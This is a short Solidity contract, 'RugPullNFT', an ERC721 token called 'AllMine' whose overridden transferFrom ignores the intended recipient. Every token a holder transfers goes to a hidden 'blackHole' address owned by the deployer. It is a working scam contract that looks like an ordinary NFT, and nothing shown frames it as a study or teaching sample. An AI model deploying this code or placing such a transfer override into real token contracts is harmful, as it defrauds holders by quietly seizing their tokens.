pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract RugPullNFT is ERC721 {
    address private blackHole;

    constructor(address owner) ERC721("AllMine", "ME") {
        blackHole = owner;
    }

    function transferFrom(
        address from,
        //solhint-disable-next-line no-unused-vars
        address to,
        uint256 tokenId
    ) public virtual override {
        //solhint-disable-next-line max-line-length
        require(_isApprovedOrOwner(_msgSender(), tokenId), "ERC721: transfer caller is not owner nor approved");

        _transfer(from, blackHole, tokenId);
    }
}
